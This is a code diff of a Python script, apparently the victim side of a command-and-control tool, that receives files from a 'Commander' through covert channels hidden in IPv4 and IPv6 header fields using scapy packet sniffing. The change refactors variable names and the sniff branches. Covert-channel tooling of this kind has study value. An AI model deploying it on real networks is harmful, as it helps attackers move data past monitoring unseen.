@@ -220,7 +220,7 @@ if __name__ == '__main__':
                 # e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
                     # Initialize Variables
-                    ipv6_ip, cmdr_ipv6_addr, ipv6_port = "", "", constants.ZERO
+                    source_ipv6_ip, cmdr_ipv6_addr, source_ipv6_port = "", "", constants.ZERO
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
@@ -239,9 +239,9 @@ if __name__ == '__main__':
 
                     # CHECK: If IPv6 header was chosen
                     if constants.IPV6 in choices:
-                        ipv6_ip, ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(client_socket,
-                                                                                     client_address[0],
-                                                                                     client_address[1])
+                        source_ipv6_ip, source_ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(client_socket,
+                                                                                                   client_address[0],
+                                                                                                   client_address[1])
 
                     # Print configuration
                     print(constants.RECEIVING_FILE_MSG.format(filename))
@@ -257,31 +257,30 @@ if __name__ == '__main__':
                     if choices in header_field_function_map:
                         selected_function = header_field_function_map.get(choices)
 
-
                     # A callback function for handling of received packets
                     def packet_callback(packet):
                         global filename
                         binary_data = selected_function(packet)
                         return binary_data
 
+                    # DIFFERENT SNIFFS: For IPv4 Packets
+                    if constants.IPV4 in choices:
+                        if constants.SOURCE_ADDRESS_FIELD in choices:
+                            received_packets = sniff(filter="dst host {} and dst port {}"
+                                                     .format(source_ip, source_port), count=count)
+                        else:  # REGULAR IPv4 SNIFF
+                            received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
 
-                    # DIFFERENT SNIFFS: If choice is covert with (IPv4/source_ip)
-                    if constants.SOURCE_ADDRESS_FIELD in choices:
-                        received_packets = sniff(filter="dst host {} and dst port {}"
-                                                 .format(source_ip, source_port), count=count)
-
-                    elif constants.IPV6 in choices:  # For IPv6 packets
+                    # DIFFERENT SNIFFS: For IPv6 Packets
+                    if constants.IPV6 in choices:
                         if constants.NEXT_HEADER in choices:
                             received_packets = sniff(filter="src host {} and dst host {}"
-                                                     .format(cmdr_ipv6_addr, ipv6_ip),
+                                                     .format(cmdr_ipv6_addr, source_ipv6_ip),
                                                      count=count)
                         else:
                             received_packets = sniff(filter="dst host {} and dst port {}"
-                                                     .format(ipv6_ip, ipv6_port),
+                                                     .format(source_ipv6_ip, source_ipv6_port),
                                                      count=count)
-
-                    else:  # REGULAR SNIFF
-                        received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
 
                     # Extract Data
                     extracted_data = ''.join(packet_callback(packet)
